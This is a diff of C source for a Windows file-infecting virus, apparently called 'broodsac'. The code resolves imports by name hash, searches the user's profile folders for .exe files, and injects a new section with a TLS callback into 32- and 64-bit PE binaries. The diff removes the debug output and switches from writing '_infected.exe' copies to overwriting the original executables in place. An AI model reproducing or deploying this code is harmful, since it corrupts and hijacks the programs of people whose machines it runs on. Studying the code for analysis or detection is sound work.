@@ -5,6 +5,8 @@
 #include <shlobj.h>
 #include "infections.h"
 
+/* Microsoft hates people like us so they don't define everything in their headers,
+   but we are resilient and share C headers, copy these headers to piss off a Microsoft dev */
 typedef struct FULL_PEB_LDR_DATA
 {
    ULONG Length;
@@ -98,6 +100,9 @@ typedef struct __InfectorIAT
    SHGetFolderPathAHeader getFolderPath;
 } InfectorIAT;
 
+/* the CVector functionality provides a basic C-style version of the vector object
+ * in C++. understanding their functionality should be pretty straight-forward to
+ * understand. */
 typedef struct __CVector
 {
    size_t type_size;
@@ -105,10 +110,12 @@ typedef struct __CVector
    void *data;
 } CVector;
 
+/* some glue that makes C casting a little less ugly */
 #define RECAST(t,e) ((t)(e))
 #define CVECTOR_CAST(v,t) RECAST(t,(v)->data)
 #define CVECTOR_BYTES(v) ((v)->type_size * (v)->elements)
 
+/* allocate a CVector object on the heap */
 CVector cvector_alloc(InfectorIAT *iat, size_t type_size, size_t elements)
 {
    CVector result;
@@ -130,6 +137,7 @@ CVector cvector_alloc(InfectorIAT *iat, size_t type_size, size_t elements)
    return result;
 }
 
+/* free the CVector from the heap */
 void cvector_free(InfectorIAT *iat, CVector *vector)
 {
    if (vector == NULL || vector->data == NULL)
@@ -141,6 +149,7 @@ void cvector_free(InfectorIAT *iat, CVector *vector)
    vector->elements = 0;
 }
 
+/* reallocate a CVector object */
 void cvector_realloc(InfectorIAT *iat, CVector *vector, size_t elements)
 {
    if (vector == NULL)
@@ -160,6 +169,7 @@ void cvector_realloc(InfectorIAT *iat, CVector *vector, size_t elements)
       iat->memset(CVECTOR_CAST(vector, uint8_t *)+(vector->type_size * old_elements), 0, (elements - old_elements) * vector->type_size);
 }
 
+/* insert an element into the C-vector at the given index within the vector */
 void cvector_insert(InfectorIAT *iat, CVector *vector, size_t index, void *element)
 {
    if (vector == NULL || element == NULL)
@@ -193,6 +203,7 @@ void cvector_insert(InfectorIAT *iat, CVector *vector, size_t index, void *eleme
    iat->memcpy(CVECTOR_CAST(vector,uint8_t *)+(vector->type_size * index), element, vector->type_size);
 }
 
+/* remove an element from the CVector */
 void cvector_remove(InfectorIAT *iat, CVector *vector, size_t index)
 {
    if (vector == NULL || index >= vector->elements)
@@ -206,6 +217,7 @@ void cvector_remove(InfectorIAT *iat, CVector *vector, size_t index)
    cvector_realloc(iat, vector, vector->elements-1);
 }
 
+/* push an element at the end of the CVector */
 void cvector_push(InfectorIAT *iat, CVector *vector, void *element)
 {
    if (vector == NULL || element == NULL)
@@ -214,6 +226,7 @@ void cvector_push(InfectorIAT *iat, CVector *vector, void *element)
    cvector_insert(iat, vector, vector->elements, element);
 }
 
+/* remove an element from the front of the CVector */
 void cvector_dequeue(InfectorIAT *iat, CVector *vector, void *element)
 {
    if (vector == NULL)
@@ -240,6 +253,15 @@ uint32_t fnv321a(const char *string)
 
 LPCVOID get_proc_by_hash(const PIMAGE_DOS_HEADER module, uint32_t hash)
 {
+   /* the export directory of a PE file essentially contains an index of named
+    * functions provided by the DLL. there is a name array, an index array, and
+    * a function array. the index of the name array correlates to the index of the
+    * index array (known as the ordinal array), which provides the index into the
+    * function array containing our target function, which is an rva address to the
+    * target function's code. this function effectively performs an fnv321a hash on
+    * the name of the functions in the dll until it finds its target, otherwise it
+    * returns null. */
+   
    const IMAGE_NT_HEADERS *nt_headers = RECAST(const IMAGE_NT_HEADERS *, RECAST(const uint8_t *,module)+module->e_lfanew);
    const IMAGE_EXPORT_DIRECTORY *export_directory = RECAST(const IMAGE_EXPORT_DIRECTORY *,
                                                            RECAST(const uint8_t *,module)+nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
@@ -260,6 +282,7 @@ LPCVOID get_proc_by_hash(const PIMAGE_DOS_HEADER module, uint32_t hash)
    return NULL;
 }
 
+/* convert a given RVA in a module object to an offset */
 DWORD rva_to_offset(CVector *module, DWORD rva)
 {
    PIMAGE_NT_HEADERS32 nt_headers = RECAST(PIMAGE_NT_HEADERS32,CVECTOR_CAST(module, uint8_t *)+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew);
@@ -275,6 +298,7 @@ DWORD rva_to_offset(CVector *module, DWORD rva)
    return 0;
 }
 
+/* create the relocations in the relocation table necessary for our injected TLS directory */
 void create_tls_relocations(InfectorIAT *iat, CVector *module, IMAGE_SECTION_HEADER *new_section, CVector *new_section_data, BOOL arch_switch)
 {
    uint8_t *byte_module = CVECTOR_CAST(module, uint8_t *);
@@ -285,6 +309,7 @@ void create_tls_relocations(InfectorIAT *iat, CVector *module, IMAGE_SECTION_HEA
       PIMAGE_NT_HEADERS32 nt32;
    } nt_headers;
 
+   /* get the NT headers for each arch */
    if (arch_switch)
       nt_headers.nt64 = RECAST(PIMAGE_NT_HEADERS64,byte_module+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew);
    else
@@ -296,6 +321,7 @@ void create_tls_relocations(InfectorIAT *iat, CVector *module, IMAGE_SECTION_HEA
       PIMAGE_TLS_DIRECTORY32 tls32;
    } tls_ptr;
 
+   /* get the TLS headers for each arch */
    if (arch_switch)
       tls_ptr.tls64 = CVECTOR_CAST(new_section_data, PIMAGE_TLS_DIRECTORY64);
    else
@@ -348,18 +374,15 @@ void create_tls_relocations(InfectorIAT *iat, CVector *module, IMAGE_SECTION_HEA
 
    if (arch_switch)
    {
-      printf("\t\tRelocation RVA is 0x%08x\n", nt_headers.nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
       reloc_offset = rva_to_offset(module,
                                    nt_headers.nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    }
    else
    {
-      printf("\t\tRelocation RVA is 0x%08x\n", nt_headers.nt32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
       reloc_offset = rva_to_offset(module,
                                    nt_headers.nt32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    }
    
-   printf("\t\tRelocation offset is 0x%08x\n", reloc_offset);
    PIMAGE_BASE_RELOCATION base_relocation = RECAST(PIMAGE_BASE_RELOCATION, byte_module+reloc_offset);
 
    while (base_relocation->VirtualAddress != 0)
@@ -374,9 +397,7 @@ void create_tls_relocations(InfectorIAT *iat, CVector *module, IMAGE_SECTION_HEA
       nt_headers.nt32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size += block_size;
    
    base_relocation->VirtualAddress = CVECTOR_CAST(&relocations,DWORD *)[0] & 0xFFFFF000;
-   printf("\t\tRelocating 0x%08x\n", base_relocation->VirtualAddress);
    base_relocation->SizeOfBlock = block_size;
-   printf("\t\tNumber of relocations: %ll\n", relocations.elements);
 
    /* iterate over our relocation rvas and patch them into the relocation table */
    WORD *relocation_array = RECAST(WORD *,RECAST(uint8_t *,base_relocation)+sizeof(DWORD)*2);
@@ -384,11 +405,15 @@ void create_tls_relocations(InfectorIAT *iat, CVector *module, IMAGE_SECTION_HEA
    for (size_t i=0; i<relocations.elements; ++i)
    {
       if (arch_switch)
+      {
+         /* create an ABSOLUTE relocation */
          relocation_array[i] = (10 << 12) | (CVECTOR_CAST(&relocations, DWORD *)[i] & 0xFFF);
+      }
       else
+      {
+         /* create a HIGHLOW relocation */
          relocation_array[i] = (3 << 12) | (CVECTOR_CAST(&relocations, DWORD *)[i] & 0xFFF);
-      
-      printf("\t\t\tRelocation value: 0x%04x\n", relocation_array[i]);
+      }
    }
 
    cvector_free(iat, &relocations);
@@ -694,10 +719,7 @@ CVector infect_32bit(InfectorIAT *iat, CVector *module)
       new_section_offset += nt_headers->OptionalHeader.FileAlignment - (new_section_offset % nt_headers->OptionalHeader.FileAlignment);
 
    if (new_section_offset < module->elements) /* there's appended data to this binary, do not tamper */
-   {
-      puts("\t\tAppended data on binary, cowardly quitting.\n");
       return result;
-   }
 
    /* increment the number of sections in the binary */
    nt_headers->FileHeader.NumberOfSections += 1;
@@ -741,10 +763,7 @@ CVector infect_64bit(InfectorIAT *iat, CVector *module)
       new_section_offset += nt_headers->OptionalHeader.FileAlignment - (new_section_offset % nt_headers->OptionalHeader.FileAlignment);
 
    if (new_section_offset < module->elements) /* there's appended data to this binary, do not tamper */
-   {
-      puts("\t\tAppended data on binary, cowardly quitting.\n");
       return result;
-   }
 
    /* increment the number of sections in the binary */
    nt_headers->FileHeader.NumberOfSections += 1;
@@ -809,12 +828,12 @@ void load_infector_iat(InfectorIAT *iat)
 
 int infect(void)
 {
+   /* load our imports via custom GetProcAddress functions */
    InfectorIAT iat;
    load_infector_iat(&iat);
 
-#ifdef BROODSACDEBUG
-   // TODO make this a compiler-controlled variable that points at our built executables
-   char profile_directory[MAX_PATH+1] = "C:\\Users\\teal\\Documents\\broodsac";
+#ifdef BROODSAC_DEBUG
+   char profile_directory[MAX_PATH+1] = BROODSAC_INFECTABLES;
 #else
    char profile_directory[MAX_PATH+1];
 
@@ -822,6 +841,9 @@ int infect(void)
       return 1;
 #endif
 
+   /* dinosaur that Windows is, pathnames are short as hell.
+    * prepending this magic string allows us to access path names that are HUGE!
+    */
    char prepend_path[] = "\\\\?\\";
    size_t root_size = iat.strlen(prepend_path)+iat.strlen(profile_directory)+1;
    char *search_root = RECAST(char *,iat.malloc(root_size));
@@ -832,8 +854,11 @@ int infect(void)
    CVector search_stack = cvector_alloc(&iat, sizeof(char *), 1);
    CVECTOR_CAST(&search_stack, char **)[0] = search_root;
 
+   /* create a vector of found executables */
    CVector found_executables = cvector_alloc(&iat, sizeof(char *), 0);
 
+   /* iteratively search through directories in the target path via the
+    * FindFirstFile API */
    while (search_stack.elements > 0)
    {
       char *search_visit;
@@ -869,6 +894,7 @@ int infect(void)
 
             cvector_push(&iat, &search_stack, &new_directory);
          }
+         /* check if the filename is an exe */
          else if (iat.strnicmp(find_data.cFileName+(iat.strlen(find_data.cFileName)-4), exeSearch, iat.strlen(exeSearch)) == 0)
          {
             char *found_executable = RECAST(char *,iat.malloc(iat.strlen(search_visit)+iat.strlen(slash)+iat.strlen(find_data.cFileName)+1));
@@ -885,8 +911,7 @@ int infect(void)
       iat.free(search_visit);
    }
 
-   printf("%ll executables were found.\n", found_executables.elements);
-
+   /* iterate over the found executables and determine if they are viable for infection */
    for (size_t i=0; i<found_executables.elements; ++i)
    {
       char *executable = CVECTOR_CAST(&found_executables, char **)[i];
@@ -899,65 +924,41 @@ int infect(void)
                                          NULL);
 
       if (exe_handle == INVALID_HANDLE_VALUE)
-      {
-         printf("\tFailed to open %s\n", executable);
          goto end_exe_loop;
-      }
-
+      
       DWORD file_size = iat.getFileSize(exe_handle, NULL);
 
       if (file_size == INVALID_FILE_SIZE)
-      {
-         printf("\t%s is larger than 4gb\n", executable);
          goto close_file;
-      }
-
+      
       CVector exe_buffer = cvector_alloc(&iat, sizeof(uint8_t), file_size);
       DWORD bytes_read = 0;
 
       if (!iat.readFile(exe_handle, CVECTOR_CAST(&exe_buffer, uint8_t *), exe_buffer.elements, &bytes_read, NULL))
-      {
-         printf("\tFailed to read %s\n", executable);
          goto free_file;
-      }
 
+      iat.closeHandle(exe_handle);
+      exe_handle = INVALID_HANDLE_VALUE;
       IMAGE_DOS_HEADER *dos_header = CVECTOR_CAST(&exe_buffer,PIMAGE_DOS_HEADER);
 
       if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
-      {
-         printf("\t%s is not a valid PE file\n", executable);
          goto free_file;
-      }
-      
+            
       IMAGE_NT_HEADERS *nt_headers = RECAST(PIMAGE_NT_HEADERS,CVECTOR_CAST(&exe_buffer,uint8_t *)+dos_header->e_lfanew);
 
       if (nt_headers->Signature != IMAGE_NT_SIGNATURE)
-      {
-         printf("\t%s is not a valid PE file\n", executable);
          goto free_file;
-      }
-      
+            
       CVector rewritten_image = cvector_alloc(&iat, sizeof(uint8_t), 0);
 
       if (nt_headers->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
-      {
-         printf("\t%s is 32-bit.\n", executable);
          rewritten_image = infect_32bit(&iat, &exe_buffer);
-      }
       else if (nt_headers->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
-      {
-         printf("\t%s is 64-bit.\n", executable);
          rewritten_image = infect_64bit(&iat, &exe_buffer);
-      }
-
+      
       if (rewritten_image.data != NULL)
       {
-         char stub[] = "_infected.exe";
-         CVector new_filename = cvector_alloc(&iat, sizeof(char), iat.strlen(executable)+iat.strlen(stub)+1);
-         iat.memcpy(new_filename.data, executable, iat.strlen(executable)+1);
-         iat.strncat(new_filename.data, stub, iat.strlen(stub));
-
-         HANDLE infected_handle = iat.createFile(CVECTOR_CAST(&new_filename, char *),
+         HANDLE infected_handle = iat.createFile(executable,
                                                  GENERIC_WRITE,
                                                  0,
                                                  NULL,
@@ -966,27 +967,17 @@ int infect(void)
                                                  NULL);
 
          if (infected_handle == INVALID_HANDLE_VALUE)
-         {
-            printf("\tFailed to open %s for writing.\n", CVECTOR_CAST(&new_filename, char *));
             goto infected_file_cleanup;
-         }
 
          DWORD bytes_written = 0;
 
          if (!iat.writeFile(infected_handle, rewritten_image.data, rewritten_image.elements, &bytes_written, NULL))
-         {
-            printf("\tFailed to write %s.\n", CVECTOR_CAST(&new_filename, char *));
             goto infected_file_close;
-         }
-
-         printf("\t%s infected.\n", executable);
          
       infected_file_close:
          iat.closeHandle(infected_handle);
 
       infected_file_cleanup:
-         iat.closeHandle(exe_handle);
-         exe_handle = INVALID_HANDLE_VALUE;
          cvector_free(&iat, &rewritten_image);
       }
 
